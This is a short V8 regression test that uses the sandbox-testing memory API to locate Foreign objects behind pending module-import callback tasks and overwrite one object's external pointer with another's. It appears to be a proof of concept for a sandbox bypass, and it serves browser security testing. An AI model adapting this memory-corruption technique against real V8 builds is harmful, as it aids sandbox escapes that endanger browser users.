// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const kHeapObjectTag = 1;
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const r32 = (addr) => mem.getUint32(addr, true);
const w32 = (addr, val) => mem.setUint32(addr, val, true);

function getTypeNameAtTagged(tagged_val) {
  const target_addr = (tagged_val - kHeapObjectTag) >>> 0;
  const name = Sandbox.getInstanceTypeOfObjectAt(target_addr);
  return name;
}

function findCallbackTasks(start_addr, max_objects = 15) {
  const tasks = [];
  let addr = start_addr >>> 0;
  var foreign_count = 0;
  for (let i = 0; i < max_objects; i++) {
    let size = Sandbox.getSizeOfObjectAt(addr);
    objtype = getTypeNameAtTagged(addr)
    if(objtype == "FOREIGN_TYPE") {
      foreign_count++;
      if(foreign_count == 2){
        print("first data found at 0x"+ (addr-1+4+Sandbox.base).toString(16));
        tasks.push(addr-1+4);
      }
      if(foreign_count == 4){
        print("second data found at 0x"+ (addr-1+4+Sandbox.base).toString(16));
        tasks.push(addr-1+4);
        break;
      }
    }
    if(objtype == "CALLBACK_TASK_TYPE") {
      print("CALLBACK_TASK_TYPE found at 0x"+addr.toString(16));
    }
    addr = (addr + size) >>> 0;
  }
  return tasks;
}

(function main() {
  const marker = { x: 1, y: 2 };
  const marker_addr = Sandbox.getAddressOf(marker);

  const p1 = import("data:text/javascript,export const a=1;");
  const p2 = import("data:text/javascript,export const b=2;");

  const tasks = findCallbackTasks(marker_addr+1);

  const t1 = tasks[tasks.length - 2];
  const t2 = tasks[tasks.length - 1];

  w32(t1,r32(t2));

  Promise.allSettled([p1, p2]).then(() => {});
})();
